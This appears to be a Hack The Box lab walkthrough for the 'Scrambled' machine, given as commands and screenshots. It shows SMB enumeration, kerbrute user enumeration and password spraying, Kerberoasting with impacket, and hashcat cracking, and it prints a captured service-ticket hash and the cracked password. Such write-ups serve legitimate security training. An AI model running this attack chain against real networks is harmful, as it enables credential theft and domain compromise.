# Scrambled

https://app.hackthebox.com/machines/476

[Walkthrough/Writeup](https://youtu.be/_8FE3JZIPfo?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf)

https://www.youtube.com/@ippsec

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/383d7c64-3c99-4b18-806a-b448d39af66a)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/3c259b3f-5fef-4a53-9081-7ca311343702)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2e531ae7-340c-4e28-a556-33cb18d8b7ec)

```
sudo nmap -sC -sV -oA enum/services.nmap 10.129.41.200
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/96411357-dc34-4251-82d2-b1225563c17e)

```
sudo nano /etc/hosts
```

```
10.129.41.200 DC1.scrm.local scrm.local
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fa42f512-b3da-4613-bc31-c5a15aa3f035)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/134cc06c-6584-4482-b15d-40a10868ea89)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a2ad16cc-4ea7-4b99-8072-0a7d37b37dd3)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0efc9b5d-fbd5-4edf-a638-ac1e6c000ab9)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/781b5b5b-87c4-486c-9f2f-d49d7b08ecf8)

```
04/09/2021:
Due to the security breach last month we have now disabled all NTLM authentication on our network.
This may cause problems for some of the programs you use so please be patient while we work to resolve any issues
```

```
smbclient -L //dc1.scrm.local
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4ccc65bb-5548-4cf2-9b3f-745961098612)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d61d6e65-4c2b-4fd9-ac7d-acc3c1bfce89)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9f89ab34-5f13-4b6a-81f7-f72e78aa4608)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/92f3af96-984d-454b-8a53-999413327b06)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9b384d25-19f1-4273-bfa6-5fdc433f980a)

_usernames.txt_

```
support
ksimpson
vbscrub
```

```
wget -c http://scrm.local/images/ipconfig.jpg
wget -c http://scrm.local/images/orders1.png
wget -c http://scrm.local/images/orders2.png
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/25f1c077-b440-4bc8-a2ed-e15264e82c78)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a4f7beff-b449-4a34-b8a3-9a83adfc1326)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/401bd55c-482c-469d-b5b1-2e7c24a5e8a1)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e4605e13-9347-4bed-ad34-b8dc99b08877)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bf334232-683b-4022-a2be-34dae5c8e95c)

https://github.com/ropnop/kerbrute

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/57933bcd-beb5-4c04-ada7-ef439735ef6d)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7b7bf405-4903-4f16-b5b6-58b4e0f1243b)

```
./kerbrute_linux_amd64 userenum -d scrm.local --dc dc1.scrm.local usernames.txt
```

```
./kerbrute_linux_amd64 userenum -d scrm.local --dc dc1.scrm.local ~/htb/Windows/Scrambled/loots/usernames.txt
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e1ef837d-8534-4b92-97bd-99719e3062a4)

```
./kerbrute_linux_amd64 passwordspray -d scrm.local --dc dc1.scrm.local ~/htb/Windows/Scrambled/loots/usernames.txt ksimpson
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f71f7ef0-235c-403c-8326-5501b52f242d)

```
smbclient -U ksimpson -L //dc1.scrm.local
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fc4a25eb-5d32-4904-92f1-57ec76853819)

```
impacket-getTGT scrm.local/ksimpson:ksimpson
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c747fcfd-8862-4229-bfb1-e168cc8b85fb)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/faad032f-5e4d-4db1-9cd9-5f51edb11c1d)

```
export KRB5CCNAME=ksimpson.ccache
```

```
klist
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e20fb72f-00d0-45c3-a32e-3f8d9f3dc380)

```
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip scrm.local -k
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c693ebcf-1a5a-4110-9623-32910ea66fd0)

```
impacket-GetUserSPNs scrm.local/ksimpson -dc-host dc1.scrm.local -k -no-pass
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f7bddaca-c8f1-4d2d-9a66-2109533d19d2)

```
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -no-pass -request
```

```
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$40f751147406a4d236b40d7d43e8cc58$6904943f739e2ab2c4ec51f53de0c03af5136d98366c65c1c9a7a993ac72006c0e7e1762b4c8d10a471da61a6a7d332bdea50739636ede8c076069b09121d0a3cf1883fffc316c9c5d3977df5cbe60f90378c258f058c195b62a5536858d3fa51ab0f5b4a0b9d96bfd29d26214944521927ca9fb139edc66131be9c267998593321f276c6735caa407e14660c44ec67ef00f119e5a9fd4faa2838e0bb00c68f6e19cde8586c1ae7327d0f7f01edb3f13f9b0dce895a6436b24285d9e213ca5b90952724f497e2f97aa8474ccca2c85ed21dbba7dc58965ad35b8efeb262b51baaa293700cc6086bc460e3ed396e7e79ef1aa9c1a275b401996b855042d3e1dfc8ea26dbc499eae1a0b0e06bd91da606496afadef1157ca2bdb726a5d69eb0f09c8e486221480f8b3c838c8be864fff978ff2bca70bd77fbd375d56733114094b22e5fa0738eab1a3c166022e3721f2b261723acaeb4a10127c257dc5acea638e82d45e11ebf2df091b879fd7266bc736e9e674ac947dc56c7bffe74c28ab59582c6b26fdf0d9859d2cd66d62f7ec4d342118ec68a1ff2fd349c5b27627aba7efd6034e2064716d9b904082c68bf308def9fd8650cacd6223b8c85fcfef33f03a24554de918cb8d3ffc932e8459762eb6017b07c3275b80d2b783fb9769c760bd8dc872890c6f2c9fc9148688975fe310a8054be08d663fa2dbadb3f08eec793a264472c95c5a65e17c3227747733d8f45a4bcceca378425001acf8dfa8132e6ec5a1c059f160e9d8f1e56cc02c26a427355b09576a3c11126b599e0b2efb3131f642c5835571dc3832695f1128b3e0025b0450c7e2cbbb15912a9e5faa2097246cf0bffcddb4b8c8ba499a14ddd6c0261e29e825a07ef633ce2b4d1c4cc8e64eb876f02414050c648b9236c28297bd57ab43d8e6a05f525a211511da6d0e39da93507c495143d4f7a4b52cdc024f5e2f42c9d16c4c531e8f640f9b6ee1c438d81272de855cfac60c8cd69e5c9dd550d9cccb5a7ec913311723f98cde0a94fe77efaccfd25ca935c2a2aead7da74ebdde826a8fd22e4295acace3d168baf974bc698f2e454579165f3280a5c003d836b7cd1b5430d0520d9793c0b4af74e75df18448ba22e1f0244f5d799f1f277d374d6aee00c26af893add646ced3f4148657a6f5abf7e022cbd94657974badcdf8ee9d31ad610d7ddc969aedb9535664c34e93d8d66882bfa23da73a5817a0c37144d6998a5b56c983a37bd3e853aa0e3630c6b49e57b3fa72935ad4a49ce719292aba4a4c61e8ada9e336e086f3d49788ab24314e0087142b236579028cde6a43e639a74409032d67259fd55d97881878f15691e7628ccb62a8e5b4eb849efb283866605335bf251c970b5aba43a1d8ee3137f3ffadebabf3c6629f0bb30f8012439d19db6be07d7cbeccbf9d
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9bb9335c-57c3-4877-ae76-8bbb54d9e641)

```
hashcat krb5tgs.hash  /usr/share/wordlists/rockyou.txt
```

```
hashcat krb5tgs.hash  --show
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/50dcff0c-ccee-4d0f-ab19-6ffbd5acd40c)

```
Pegasus60
```

